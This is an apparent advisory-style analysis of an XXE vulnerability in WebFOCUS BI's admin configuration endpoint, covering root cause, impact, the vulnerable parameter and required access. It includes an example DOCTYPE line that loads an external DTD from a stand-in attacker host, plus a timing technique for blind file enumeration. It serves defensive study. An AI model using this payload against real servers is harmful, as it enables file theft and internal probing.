Based on the provided content, here's an analysis of the XXE vulnerability (CVE-2020-14204) in WebFOCUS BI:

**Root Cause of Vulnerability:**

- The vulnerability stems from an unsafe configuration of the XML parser used by the WebFOCUS BI application. This allows for the injection of external XML entities. Specifically, the application's administration portal at `/ibi_apps/WFServlet.cfg` does not properly sanitize user-supplied input when processing XML data.

**Weaknesses/Vulnerabilities Present:**

- **XML External Entity (XXE) Injection:** The core weakness is that the application processes XML data without proper validation, allowing an attacker to inject malicious XML code, specifically external entity declarations.

**Impact of Exploitation:**

- **Arbitrary File Read:** An attacker can read arbitrary local files on the server by using file:/// URIs in the DTD.
- **Server-Side Request Forgery (SSRF):** An attacker can make the server initiate HTTP requests to arbitrary URLs by using http:// URIs in the DTD.
- **Blind Enumeration:** Using time-based attacks in conjunction with file access, attackers can perform blind enumeration of files, directories, and potentially network services accessible to the WebFOCUS server. This was achieved by using file:// URIs to network files, timing response times. If a file exists, the response is fast, if not, it takes longer.

**Attack Vectors:**

- **HTTP Request Manipulation:** The attack is carried out by crafting a malicious HTTP request to the vulnerable `/ibi_apps/WFServlet.cfg` endpoint. The malicious XML payload is embedded in the `IBICFG_content` parameter.

**Required Attacker Capabilities/Position:**

- **Administrative Access:** The attacker needs to have valid administrative credentials to access the `/ibi_apps/` administration panel and exploit the XXE vulnerability.
- **Network Access:** The attacker needs to be able to send HTTP requests to the WebFOCUS server.
- **Ability to Host DTD:** The attacker would also need to have control of a webserver to host their own DTD file if they want to perform SSRF.

**Technical Details:**

- The attacker injects a custom DTD using the SYSTEM identifier, for example:

   ```xml
    <!DOCTYPE foo SYSTEM "http://attackerURL.com/foo.dtd">
   ```
- The DTD can be designed to trigger server-side actions, such as file reads or HTTP requests to attacker-controlled servers.
- The provided example demonstrates an HTTP request to `attackerURL.com` made from the victim server.
- It was noted that the vulnerability was exploited by accessing local network files over SMB (`file:///sharedrive/name/file.txt`) and measuring response times, allowing for blind enumeration.
